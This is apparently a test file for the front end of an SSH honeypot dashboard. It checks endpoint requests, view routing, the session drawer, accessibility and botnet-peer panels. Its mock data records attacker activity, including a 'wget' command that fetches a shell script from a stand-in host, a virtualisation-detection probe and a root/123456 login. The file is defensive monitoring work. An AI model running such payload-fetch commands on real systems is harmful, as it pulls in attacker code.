import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { render, screen, waitFor, fireEvent, within } from "@testing-library/react";
import App from "../App";

/**
 * Whole-app wiring. The component tests cover each panel in isolation; this
 * covers the part that isolation cannot — that App requests the right URLs,
 * hands the responses to the right panels, and drives the session drawer from
 * the query string.
 */

const SESSION = {
  session_id: "abc123", src_ip: "1.2.3.4", country_iso: "CN", city: "Beijing",
  org: "Chinanet", started_at: "2026-08-16T10:00:00Z", duration_ms: 30000,
  events: 6, commands: 3, logins: 2,
};

function payloadFor(url) {
  if (url.includes("/peers")) {
    return {
      rows: [{ peer_ip: "158.51.96.38", list_count: 41, country_iso: "US", asn: 3356,
               org: "NETINF-TRANSIT-AS", city: null,
               first_seen: "2025-11-27T00:00:00Z", last_seen: "2026-09-26T00:00:00Z" }],
      total: 1930, lists: 163, emptyLists: 46,
      firstSeen: "2025-11-27T00:00:00Z", lastSeen: "2026-09-26T00:00:00Z",
    };
  }
  if (url.includes("/probes")) {
    return {
      threshold: 3, minScore: 3, total: 1,
      rows: [{ command: "systemd-detect-virt; dmidecode", probe_score: 8,
               probe_rules: ["virt-detection-tool", "dmi-identity"],
               total: 4, unique_ips: 2,
               first_seen: "2026-01-01T00:00:00Z", last_seen: "2026-09-01T00:00:00Z" }],
    };
  }
  if (url.includes("/mitre")) return [{ id: "T1105", name: "Ingress Tool Transfer (T1105)", description: "d" }];
  if (url.includes("/sessions/")) {
    return {
      session: { ...SESSION, truncated: false },
      events: [{ timestamp: "2026-08-16T10:00:20Z", command: "wget http://a/b.sh", username: null, password: null, tags: ["T1105"] }],
    };
  }
  if (url.includes("/commands")) return { rows: [{ command: "wget http://a/b.sh", total: 9, unique_ips: 3, tags: ["T1105"] }], total: 1, counts: { T1105: 1 }, allTotal: 1 };
  if (url.includes("/creds")) return { rows: [{ username: "root", password: "123456", total: 4, unique_ips: 2 }], total: 1 };
  if (url.includes("/files")) return { rows: [{ sha256: "deadbeef", size_bytes: 512, first_seen: "2026-08-16T09:00:00Z", vt_type: "ELF" }], total: 1 };
  if (url.includes("/top-asn")) return { rows: [{ asn: 4134, org: "Chinanet", total: 7, unique_ips: 3 }], total: 1 };
  if (url.includes("/top-countries")) return [{ country_iso: "CN", total: 7, unique_ips: 3 }];
  if (url.includes("/events-per-hour")) return [{ hour: "2026-08-16T09:00:00.000Z", events: 7 }];
  if (url.includes("/summary")) return { attacks24h: 7, peakEvents: 7, peakHour: "2026-08-16T09:00:00.000Z", malwareSamples: 1, uniqueCommands: 1, uniqueCredCount: 1, uniqueIpPercent: 42, lifetimeEvents: 7682319, lifetimeUniqueIps: 24122, lifetimeCountries: 153, firstEventAt: "2025-11-24T11:17:57.647Z" };
  if (url.includes("/latest")) return [{ timestamp: "2026-08-16T10:00:20Z", src_ip: "1.2.3.4", dest_port: 22, username: null, password: null, command: null, session_id: "abc123", country_iso: "CN", asn: 4134, org: "Chinanet", city: "Beijing" }];
  return [];
}

describe("App", () => {
  let requested;

  beforeEach(() => {
    requested = [];
    window.history.replaceState(null, "", "/");
    global.fetch = vi.fn((url) => {
      requested.push(String(url));
      return Promise.resolve({ ok: true, json: () => Promise.resolve(payloadFor(String(url))) });
    });
  });

  afterEach(() => { vi.restoreAllMocks(); });

  it("loads the overview's endpoints and renders their data", async () => {
    render(<App />);
    await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());

    for (const path of ["/latest", "/summary", "/commands", "/creds", "/top-countries", "/events-per-hour", "/mitre", "/sessions/featured"]) {
      expect(requested.some((u) => u.includes(path)), `expected a request to ${path}`).toBe(true);
    }

    // Data from separate endpoints reaching their own panels.
    await waitFor(() => expect(screen.getAllByText(/wget http:\/\/a\/b\.sh/).length).toBeGreaterThan(0));
    expect(screen.getAllByText(/Chinanet/).length).toBeGreaterThan(0);
  });

  it("only fetches what the current view shows", async () => {
    // The single-page dashboard requested every endpoint on load to fill
    // panels most visitors never scrolled to.
    render(<App />);
    await screen.findByText(/attacks recorded/i);
    for (const path of ["/files", "/payload-hosts", "/top-asn", "/peers", "/probes"]) {
      expect(requested.some((u) => u.includes(path)), `did not expect ${path} on the overview`).toBe(false);
    }
  });

  it("fetches a view's data once that view is opened", async () => {
    render(<App />);
    fireEvent.click(await screen.findByRole("tab", { name: "Malware" }));
    await waitFor(() => expect(requested.some((u) => u.includes("/files"))).toBe(true));
    expect(requested.some((u) => u.includes("/payload-hosts"))).toBe(true);
    expect(await screen.findByText(/deadbeef/)).toBeInTheDocument();
  });

  it("keeps the active view in the url, and Back returns to the previous one", async () => {
    render(<App />);
    fireEvent.click(await screen.findByRole("tab", { name: "Commands" }));
    expect(window.location.search).toContain("view=commands");
    expect(screen.getByRole("tab", { name: "Commands" })).toHaveAttribute("aria-selected", "true");

    window.history.back();
    await waitFor(() => expect(window.location.search).not.toContain("view="));
    await waitFor(() =>
      expect(screen.getByRole("tab", { name: "Overview" })).toHaveAttribute("aria-selected", "true")
    );
  });

  describe("on a desktop", () => {
    const realMatchMedia = window.matchMedia;
    beforeEach(() => {
      window.localStorage.clear();
      window.matchMedia = (query) => ({
        matches: query.includes("min-width: 1024px"),
        media: query,
        addEventListener: vi.fn(), removeEventListener: vi.fn(),
        addListener: vi.fn(), removeListener: vi.fn(), dispatchEvent: vi.fn(),
      });
    });
    afterEach(() => { window.matchMedia = realMatchMedia; });

    it("navigates from a grouped sidebar of real links", async () => {
      render(<App />);
      const nav = await screen.findByRole("navigation", { name: /dashboard sections/i });
      expect(within(nav).getByText("Investigate")).toBeInTheDocument();
      const link = within(nav).getByRole("link", { name: "Malware" });
      // A real href, so middle-click opens the view in a new tab.
      expect(link).toHaveAttribute("href", "/?view=malware");
      fireEvent.click(link);
      expect(window.location.search).toContain("view=malware");
      expect(within(nav).getByRole("link", { name: "Malware" })).toHaveAttribute("aria-current", "page");
      expect(screen.queryByRole("tablist")).toBeNull();
    });

    it("collapses to an icon rail and remembers it", async () => {
      const { unmount } = render(<App />);
      fireEvent.click(await screen.findByRole("button", { name: /collapse sidebar/i }));
      expect(screen.getByRole("button", { name: /expand sidebar/i })).toBeInTheDocument();
      unmount();
      render(<App />);
      expect(await screen.findByRole("button", { name: /expand sidebar/i })).toBeInTheDocument();
    });
  });

  it("names the current view in the browser tab", async () => {
    render(<App />);
    await waitFor(() => expect(document.title).toMatch(/^hunajapannu\.fi — Live SSH honeypot/));
    fireEvent.click(await screen.findByRole("tab", { name: "Credentials" }));
    await waitFor(() => expect(document.title).toBe("Credentials · hunajapannu.fi"));
  });

  it("says what the site is before any figures", async () => {
    // Linked from a CV: the first visitor may never have heard of a honeypot.
    render(<App />);
    const heading = await screen.findByRole("heading", { level: 2, name: /real attacks against a real server/i });
    expect(within(heading.closest("section")).getByRole("link", { name: "Oskari Kosonen" })).toBeInTheDocument();
  });

  it("opens straight into the view a shared link names", async () => {
    window.history.replaceState(null, "", "/?view=origins&origins=asn");
    render(<App />);
    expect(await screen.findByText("AS4134")).toBeInTheDocument();
    expect(screen.getByRole("tab", { name: "Origins" })).toHaveAttribute("aria-selected", "true");
  });

  it("falls back to the overview for an unknown view", async () => {
    window.history.replaceState(null, "", "/?view=nope");
    render(<App />);
    expect(await screen.findByRole("tab", { name: "Overview" })).toHaveAttribute("aria-selected", "true");
  });

  it("moves between views with the arrow keys", async () => {
    render(<App />);
    const overview = await screen.findByRole("tab", { name: "Overview" });
    fireEvent.keyDown(overview, { key: "ArrowRight" });
    expect(screen.getByRole("tab", { name: "Live activity" })).toHaveAttribute("aria-selected", "true");
    expect(screen.getByRole("tab", { name: "Live activity" })).toHaveFocus();
  });

  it("flags the sensor as stale when no event has arrived for a while", async () => {
    // The fixture's newest event is months old.
    render(<App />);
    await waitFor(() =>
      expect(screen.getAllByRole("status").some((el) => /no events for/i.test(el.textContent))).toBe(true)
    );
  });

  it("shows the sensor as live when events are fresh", async () => {
    const fresh = new Date(Date.now() - 20_000).toISOString();
    global.fetch = vi.fn((url) => {
      const u = String(url);
      requested.push(u);
      const body = u.includes("/latest") ? [{ ...payloadFor(u)[0], timestamp: fresh }] : payloadFor(u);
      return Promise.resolve({ ok: true, json: () => Promise.resolve(body) });
    });
    render(<App />);
    await waitFor(() =>
      expect(screen.getAllByRole("status").some((el) => /live · last event/i.test(el.textContent))).toBe(true)
    );
  });

  it("opens a session from a row in the live feed", async () => {
    window.history.replaceState(null, "", "/?view=activity");
    render(<App />);
    const rows = await screen.findAllByTitle("Open session from 1.2.3.4");
    fireEvent.click(rows[0]);
    await waitFor(() => expect(window.location.search).toContain("session=abc123"));
    expect(await screen.findByRole("dialog", { name: /session timeline/i })).toBeInTheDocument();
  });

  it("asks for only a page of rows, not thousands", async () => {
    window.history.replaceState(null, "", "/?view=commands");
    render(<App />);
    await waitFor(() => expect(requested.some((u) => u.includes("/commands")), "commands requested").toBe(true));
    const commands = requested.find((u) => u.includes("/commands"));
    expect(commands).toContain("limit=100");
    // The old dashboard pulled limit=3000/1000 on every refresh.
    expect(requested.some((u) => /limit=(3000|1000)/.test(u))).toBe(false);
  });

  it("shows the viewer's timezone so timestamps are unambiguous", async () => {
    render(<App />);
    await waitFor(() => expect(screen.getByText(/times in/i)).toBeInTheDocument());
  });

  it("opens the session drawer straight from a shared ?session= link", async () => {
    window.history.replaceState(null, "", "/?session=abc123");
    render(<App />);
    await waitFor(() => expect(screen.getByRole("dialog", { name: /session timeline/i })).toBeInTheDocument());
    expect(requested.some((u) => u.includes("/sessions/abc123"))).toBe(true);
  });

  it("puts the opened session into the url so it can be shared", async () => {
    render(<App />);
    // The front-page replay is the only way into a timeline now that the
    // browsable session list is gone. "Full timeline" stays reachable even
    // when the replay is collapsed, which is why this does not expand first.
    const btn = await screen.findByRole("button", { name: /full timeline/i });
    fireEvent.click(btn);
    await waitFor(() => expect(window.location.search).toContain("session=abc123"));
    expect(await screen.findByRole("dialog", { name: /session timeline/i })).toBeInTheDocument();
  });

  it("closes the drawer on Escape and clears it from the url", async () => {
    window.history.replaceState(null, "", "/?session=abc123");
    render(<App />);
    await screen.findByRole("dialog", { name: /session timeline/i });
    fireEvent.keyDown(document, { key: "Escape" });
    await waitFor(() => expect(screen.queryByRole("dialog")).toBeNull());
    expect(window.location.search).not.toContain("session=");
  });

  it("restores a search from the url and sends it to the API", async () => {
    // ?q= drove the deleted session list; ?cred= is the same mechanism on a
    // panel that still exists.
    window.history.replaceState(null, "", "/?view=credentials&cred=root");
    render(<App />);
    await waitFor(() =>
      expect(requested.some((u) => u.includes("/creds") && u.includes("search=root"))).toBe(true)
    );
  });

  it("shows the hero as soon as the summary lands, without waiting for events", async () => {
    // The boot screen used to gate on /summary AND /latest, so the most
    // striking content on the page sat behind whichever was slower.
    global.fetch = vi.fn((url) => {
      const u = String(url);
      requested.push(u);
      if (u.includes("/latest")) return new Promise(() => {}); // never resolves
      return Promise.resolve({ ok: true, json: () => Promise.resolve(payloadFor(u)) });
    });
    render(<App />);
    await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());
    // Lifetime figures come from /summary and should already be on screen.
    expect(screen.getByText(/attacks recorded/i)).toBeInTheDocument();
  });

  it("renders the lifetime figures the summary returns", async () => {
    // These shipped broken: /summary returned them and ProjectSummary accepted
    // them, but App never threaded them into summaryStats, so the `> 0` guard
    // on the hero strip was always false and it silently never rendered.
    render(<App />);
    expect(await screen.findByText(/attacks recorded/i)).toBeInTheDocument();
    expect(screen.getByText("7.7M")).toBeInTheDocument();
    expect(screen.getByText("24,122")).toBeInTheDocument();
    expect(screen.getByText("153")).toBeInTheDocument();
  });

  it("keeps rendering when one endpoint fails", async () => {
    global.fetch = vi.fn((url) => {
      const u = String(url);
      requested.push(u);
      if (u.includes("/top-countries")) return Promise.resolve({ ok: false, status: 500 });
      return Promise.resolve({ ok: true, json: () => Promise.resolve(payloadFor(u)) });
    });
    render(<App />);
    await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());
    expect(await screen.findByText(/failed to load countries/i)).toBeInTheDocument();
    // The rest of the dashboard is unaffected.
    expect(screen.getAllByText(/wget http:\/\/a\/b\.sh/).length).toBeGreaterThan(0);
  });

  /**
   * Structure a screen reader navigates by. The dashboard is a long single
   * page of a dozen panels, so headings and landmarks are the only way to
   * move around it without tabbing through every row of the live feed.
   */
  describe("document structure", () => {
    it("exposes one main landmark and a skip link that targets it", async () => {
      render(<App />);
      await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());

      const main = document.querySelector("main");
      expect(main).not.toBeNull();
      expect(document.querySelectorAll("main").length).toBe(1);

      const skip = screen.getByRole("link", { name: /skip to content/i });
      expect(skip.getAttribute("href")).toBe(`#${main.id}`);
    });

    it("gives every panel a real heading, not a styled span", async () => {
      render(<App />);
      await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());

      // The panel titles were pill-shaped spans, which look like headings and
      // are invisible to heading navigation. Any number here is arbitrary; the
      // point is that it is not two.
      const headings = screen.getAllByRole("heading", { level: 2 });
      expect(headings.length).toBeGreaterThanOrEqual(6);
    });

    it("keeps the footer outside the main landmark", async () => {
      render(<App />);
      await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());
      const footer = document.querySelector("footer");
      expect(footer).not.toBeNull();
      expect(document.querySelector("main").contains(footer)).toBe(false);
    });
  });

  describe("phase 3 and 5 panels", () => {
    beforeEach(() => { window.history.replaceState(null, "", "/?view=botnet"); });

    it("shows the persistent peers with their recurrence", async () => {
      render(<App />);
      // The count is the whole point of the panel: a peer in 41 separate
      // bootstrap lists is infrastructure, not a one-off sighting.
      expect(await screen.findByText("158.51.96.38", { exact: false })).toBeInTheDocument();
      expect(screen.getByText("41")).toBeInTheDocument();
    });

    it("shows the denominators, so a count can be judged", async () => {
      render(<App />);
      expect(await screen.findByText(/1,930 peers/)).toBeInTheDocument();
      // The 46 launches that shipped no peers are only visible here.
      expect(screen.getByText(/163 lists captured \(46 empty\)/)).toBeInTheDocument();
    });

    it("shows a probe score alongside the rules that produced it", async () => {
      render(<App />);
      expect(await screen.findByText("systemd-detect-virt; dmidecode")).toBeInTheDocument();
      // Scoped by title: a bare "8" also appears in other panels on the page.
      expect(screen.getByTitle("Accumulated rule weight")).toHaveTextContent("8");
      // The row says what kind of check it was, and the full rule list stays
      // reachable on hover rather than printed as eight chips per row.
      expect(screen.getByText("hypervisor check")).toBeInTheDocument();
      expect(screen.getByTitle("virt-detection-tool, dmi-identity")).toBeInTheDocument();
    });
  });
});
